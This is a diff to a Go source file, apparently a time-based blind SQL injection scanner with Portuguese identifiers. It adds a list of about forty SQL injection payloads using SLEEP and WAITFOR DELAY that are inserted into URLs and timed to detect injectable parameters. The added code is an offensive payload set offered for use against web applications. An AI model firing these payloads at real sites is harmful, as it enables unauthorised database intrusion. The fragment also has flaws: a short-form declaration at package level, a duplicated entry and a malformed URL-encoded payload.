@@ -16,6 +16,48 @@ const (
 	reset = "\033[0m"
 )
 
+payloads := []string{
+		"0'XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR'Z",
+		"0\\\"XOR(if(now()=sysdate(),sleep(tempoSQLi),0))XOR\\\"Z",
+		"1 or sleep(tempoSQLi)#",
+		"1) or sleep(tempoSQLi)#",
+		"1) or sleep(tempoSQLi)#",
+		"1)) or sleep(tempoSQLi)#",
+		"1') WAITFOR DELAY 'tempoSQLi' AND ('1337'='1337",
+		"1) WAITFOR DELAY 'tempoSQLi' AND (1337=1337",
+		"';%5waitfor%5delay%5'tempoSQLi'%5--%5",
+		"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))bAKL) AND 'vRxe'='vRxe",
+		"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)",
+		"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)#",
+		"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))nQIP)--",
+		"AND (SELECT * FROM (SELECT(SLEEP(tempoSQLi)))YjoC) AND '%'='",
+		"AnD SLEEP(tempoSQLi)",
+		"AnD SLEEP(tempoSQLi)#",
+		"AnD SLEEP(tempoSQLi)--",
+		"' AnD SLEEP(tempoSQLi) ANd '1",
+		"and WAITFOR DELAY 'tempoSQLi'",
+		"and WAITFOR DELAY 'tempoSQLi'--",
+		") IF (1=1) WAITFOR DELAY 'tempoSQLi'--",
+		"ORDER BY SLEEP(tempoSQLi)",
+		"ORDER BY SLEEP(tempoSQLi)#",
+		"ORDER BY SLEEP(tempoSQLi)--",
+		" or sleep(tempoSQLi)#",
+		" or sleep(tempoSQLi)=",
+		") or sleep(tempoSQLi)=",
+		")) or sleep(tempoSQLi)=",
+		"' or sleep(tempoSQLi)#",
+		"' or sleep(tempoSQLi)='",
+		"') or sleep(tempoSQLi)='",
+		"')) or sleep(tempoSQLi)='",
+		"or SLEEP(tempoSQLi)",
+		"or SLEEP(tempoSQLi)#",
+		"or SLEEP(tempoSQLi)--",
+		"or SLEEP(tempoSQLi)=",
+		"or SLEEP(tempoSQLi)='",
+		"or WAITFOR DELAY 'tempoSQLi'",
+		"or WAITFOR DELAY 'tempoSQLi'--"
+	}
+
 func medirTempoRequisicao(url string) float64 {
 	inicio := time.Now()
 
@@ -30,6 +72,8 @@ func medirTempoRequisicao(url string) float64 {
 	tempoTotal := fim.Sub(inicio).Seconds()
 	return tempoTotal
 }
+
+
 
 func replaceFuzz(urlString string,tempoSQLi float64) string {
 	// Substitui todas as ocorrências de "FUZZ" pela string desejada
